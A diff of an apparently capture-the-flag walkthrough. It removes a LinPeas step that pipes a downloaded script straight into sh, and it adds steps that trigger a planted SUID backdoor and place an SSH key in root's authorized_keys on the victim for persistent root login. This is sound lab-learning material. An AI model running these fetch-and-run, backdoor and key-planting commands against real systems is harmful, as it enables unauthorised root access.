@@ -281,44 +281,27 @@ Password: snowflake
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-#### LinPeas
-
-**Kali**
-
-```
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-python2 -m SimpleHTTPServer 81
-```
+## Privilege Escalation
 
 **Victim**
 
 ```
-cd /tmp/
-wget http://$KALI:81/linpeas.sh
-chmod +x linpeas.sh 
-./linpeas.sh
+cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/
+cat VIGQFQFMYOST.php
 ```
 
+<figure><img src="../../.gitbook/assets/image (694).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Victim**
+
+```
+/lib/defended/libc.so.99;uname -a; w; $suid_bd
+whoami
+```
+
+<figure><img src="../../.gitbook/assets/image (695).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -328,6 +311,40 @@ chmod +x linpeas.sh
 
 
 
+## Secret Flag
+
+**Kali**
+
+```
+ssh-keygen -t rsa
+cat /root/epic.pub
+```
+
+<figure><img src="../../.gitbook/assets/image (696).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+vi /root/.ssh/authorized_keys
+```
+
+<figure><img src="../../.gitbook/assets/image (697).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+ssh -i epic root@VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+grep -r  "flag{" /
+```
+
+<figure><img src="../../.gitbook/assets/image (699).png" alt=""><figcaption></figcaption></figure>
 
 
 
